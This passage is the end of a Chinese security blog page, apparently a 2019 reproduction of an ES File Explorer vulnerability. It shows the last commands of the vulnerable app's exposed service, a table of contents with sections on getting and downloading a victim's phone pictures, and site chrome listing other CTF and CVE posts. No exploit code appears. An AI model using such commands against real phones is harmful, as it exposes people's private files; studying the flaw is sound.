class="line">appLaunch：启动应用程序。需要包名称参数</span><br><span class="line">getAppThumbnail：获取应用程序的图标。包名称参数是必需的</span><br></pre></td></tr></table></figure>
+<p>其他功能感兴趣的可以自己测试，最后还要膜下发现漏洞的大佬，是真的强。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://threst.github.io">threst</a>
+            <p>原文链接: <a href="https://threst.github.io/2019/01/23/Esfile/">https://threst.github.io/2019/01/23/Esfile/</a>
+            <p>发表日期: <a href="https://threst.github.io/2019/01/23/Esfile/">January 23rd 2019, 1:32:13</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/01/23/pwnable_bof/" title= pwnable_bof >
+                    <div class="nextTitle">pwnable_bof</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/01/22/pwnable_flag/" title= pwnable_fd >
+                    <div class="prevTitle">pwnable_fd</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:3451078463@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/threst" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面的话"><span class="toc-number">1.</span> <span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试"><span class="toc-number">2.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00验证漏洞"><span class="toc-number"></span> <span class="toc-text">0x00验证漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01分析原理"><span class="toc-number"></span> <span class="toc-text">0x01分析原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02获取受害者手机图片"><span class="toc-number"></span> <span class="toc-text">0x02获取受害者手机图片</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03下载受害者图片"><span class="toc-number"></span> <span class="toc-text">0x03下载受害者图片</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04造个轮子"><span class="toc-number"></span> <span class="toc-text">0x04造个轮子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05其他功能"><span class="toc-number"></span> <span class="toc-text">0x05其他功能</span></a>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 42 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2019/01/23/Esfile/" >ES文件浏览器漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2019/01/23/pwnable_bof/" >pwnable_bof</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2019/01/22/pwnable_flag/" >pwnable_fd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2019/01/22/RLO文件名欺骗/" >RLO文件名欺骗</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2018/12/31/2018流水账/" >2018流水账</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/23</span><a class="archive-post-title" href= "/2018/12/23/readfile0day/" >readfile-0day复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/20</span><a class="archive-post-title" href= "/2018/12/20/2018鹏城杯Myblog思考/" >2018鹏城杯Myblog思考</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/2018/12/18/pwnable_collision/" >pwnable_collision</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/2018/12/18/pwnable_fd/" >pwnable_fd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2018/11/22/hackagame2018/" >hackagame2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/pwn_repeater/" >pwn之路_repeater(山东省赛)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href= "/2018/11/11/ctf/" >无处安放的wp(不定期更)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href= "/2018/11/11/pwn之路_ret2text/" >pwn之路_ret2text</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2018/11/08/hackover18/" >hackover18</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2018/11/02/HID/" >BadUSB初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2018/11/02/D-CTFQuals2018/" >D-CTFQuals2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2018/10/16/install/" >parrot安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/极客大挑战/" >极客大挑战wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/phpgd绕过/" >phpgd绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/Netcat/" >netcat食用指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/csaw2018wp/" >csaw 2018 wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/php安全/" >php安全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/网鼎杯wp/" >网鼎杯wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/tjctf2018misc/" >tjctf2018wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/cve-2017-11882/" >CVE-2017-11882复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/noxctf2018wp/" >noxctf2018wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/CVE-2017-8464漏洞复现/" >CVE-2017-8464漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/" >双杀0day漏洞(CVE-2018-8174)复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/CTF之隐写术/" >ctf之隱寫術</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2018/06/15/kali破解xp开机密码/" >艰难的kali破解xp开机密码之路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2018/06/06/利用 PATH 环境变量进行 Linux 提权/" >利用 PATH 环境变量进行 Linux 提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/61随想/" >61随想</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/常见文件格式分析/" >常见文件格式分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/如何在MIMIKATZ添加模块/" >如何在MIMIKATZ添加模块</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/实验吧wp/" >实验吧wp(持续更新)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/kali安装docker/" >kali下安装docker</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/" >你肯定不知道的GraphQL安全概述和测试技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2018/05/17/git一条龙(一看就会的那种)/" >git一条龙(一看就会的那种)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/逆向工程基础 - Linux x64/" >逆向入门--linux64</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/逆向工程入门— ARM64上的Linux/" >逆向入门--ARM64的linux</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/艰难的hexo上线/" >艰难的hexo上线</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/isccwp/" >isccwp</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="瞎记罢写"><span class="iconfont-archer">&#xe606;</span>瞎记罢写</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2017-8464"><span class="iconfont-archer">&#xe606;</span>CVE-2017-8464</span>
+    
+        <span class="sidebar-tag-name" data-tags="apt"><span class="iconfont-archer">&#xe606;</span>apt</span>
+    
+        <span class="sidebar-tag-name" data-tags="BadUSB"><span class="iconfont-archer">&#xe606;</span>BadUSB</span>
+    
+        <span class="sidebar-tag-name" data-tags="netcat"><span class="iconfont-archer">&#xe606;</span>netcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2017-11882"><span class="iconfont-archer">&#xe606;</span>CVE-2017-11882</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="kali docker"><span class="iconfont-archer">&#xe606;</span>kali docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="0day"><span class="iconfont-archer">&#xe606;</span>0day</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全客弃婴"><span class="iconfont-archer">&#xe606;</span>安全客弃婴</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2018-8174"><span class="iconfont-archer">&#xe606;</span>CVE-2018-8174</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup ctf"><span class="iconfont-archer">&#xe606;</span>writeup ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'threst'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
